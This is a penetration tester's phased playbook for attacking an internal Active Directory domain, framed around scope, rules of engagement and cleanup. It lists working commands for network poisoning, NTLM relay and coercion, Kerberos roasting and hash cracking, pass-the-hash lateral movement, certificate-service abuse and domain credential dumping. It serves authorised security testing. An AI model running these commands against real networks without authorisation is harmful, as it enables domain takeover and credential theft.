# Playbook — Internal Active Directory

Assumes network access (VPN, drop, or initial foothold). Objective is normally domain admin or a named crown-jewel server.

## Prerequisites

- [ ] `scope.md` lists every subnet and DC
- [ ] Attacker host on the internal network, tools synced
- [ ] Time synchronized with the DC (`ntpdate dc`) — Kerberos will fail otherwise
- [ ] `coverage.md` seeded with discovered subnets

## Phase 0 — Network position (15 min)

```bash
ip a; ip route; cat /etc/resolv.conf
nmap -sn 10.10.10.0/24 -oG sweep.txt
nbtscan -r 10.10.10.0/24
```

- [ ] Identify DCs (`nmap -p 88,389,445 --open`)
- [ ] Identify DNS suffix and domain name
- [ ] Confirm egress and pivot options

## Phase 1 — Unauthenticated

```bash
nxc smb 10.10.10.0/24 --gen-relay-list relay.txt
nxc smb 10.10.10.0/24 -u '' -p '' --shares --users
enum4linux-ng -A dc
nmap -p 88,389,445,636,3268 --script "ldap*,smb*,krb5*" dc
```

- [ ] SMB signing status per host
- [ ] Null session / guest access
- [ ] Password policy (lockout threshold) — do not spray before this
- [ ] Anonymous LDAP bind, user enumeration
- [ ] Known pre-auth CVEs: Zerologon, noPac, PrintNightmare, MS17-010

## Phase 2 — Credential acquisition

Priority order:

1. **Poisoning** — `responder -I eth0 -wdv`, `mitm6 -d domain` if IPv6
2. **Relay** — `ntlmrelayx` to SMB (signing off), LDAP, or ADCS HTTP
3. **Coercion** — `coercer`, PetitPotam, DFSCoerce against relay targets
4. **Spray** — one password, all users, respecting lockout
5. **Kerberos** — AS-REP roast, then kerberoast
6. **Files** — SYSVOL GPP, shares, scripts, unattend

```bash
nxc ldap dc -u user -p pass --asreproast asrep.txt
nxc ldap dc -u user -p pass --kerberoasting kerb.txt
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 13100 kerb.txt rockyou.txt
```

## Phase 3 — Domain enumeration

```bash
bloodhound-python -u user -p pass -d domain.local -ns dc -c All
nxc ldap dc -u user -p pass --users --groups --computers --gmsa
```

- [ ] BloodHound imported, shortest path to Domain Admins
- [ ] Kerberoastable accounts with high privilege
- [ ] Unconstrained delegation hosts
- [ ] ADCS enumerated: `certipy find -vulnerable`
- [ ] ACL edges: GenericAll, WriteDACL, WriteOwner, ForceChangePassword, AddMember

## Phase 4 — Privilege escalation paths

Work the shortest BloodHound path first.

| Path | Action |
| --- | --- |
| ACL edge | `dacledit`, `owneredit`, targeted kerberoast, shadow creds |
| ADCS ESC1/ESC8 | `certipy req` → `certipy auth` → DA |
| Unconstrained delegation | Coerce DC → capture TGT → `secretsdump` |
| RBCD | `addcomputer` + `rbcd.py` + S4U |
| Local admin reuse | `nxc smb --local-auth` with the same hash |
| GPO write | Push logon script to linked OU |

## Phase 5 — Lateral movement

```bash
nxc smb targets.txt -u user -H <hash> -x whoami
nxc winrm targets.txt -u user -p pass -x whoami
impacket-wmiexec domain/user:pass@host
evil-winrm -i host -u user -H <hash>
```

- [ ] Map reachable hosts per credential set
- [ ] Prefer WinRM/WMI over SMB exec (less noisy)
- [ ] Log every hop in `attack-path.md`

## Phase 6 — Objective

- [ ] Crown-jewel access proven read-only
- [ ] `secretsdump -just-dc` only if the objective requires it and RoE permits
- [ ] krbtgt hash recorded for the persistence discussion (do not use without approval)
- [ ] Trust relationships mapped if multi-domain

## Phase 7 — Cleanup and report

- [ ] Remove created computer accounts, users, ACL changes
- [ ] Document every artifact in `cleanup.md`
- [ ] Attack path diagram
- [ ] `findings.yaml` populated, `report.py` run

## Decision points

- **Signing disabled on many hosts?** Relay is the fastest path — prioritize coercion.
- **No relay target?** Poisoning + spray + kerberoast.
- **ADCS present?** Always run `certipy find -vulnerable`; ESC8/ESC1 is usually the shortest path.
- **BloodHound shows no path?** Look at local admin reuse and password reuse across hosts before assuming a dead end.

## Exit criteria

Objective reached, or every credential set exhausted against every reachable host, or window closed.
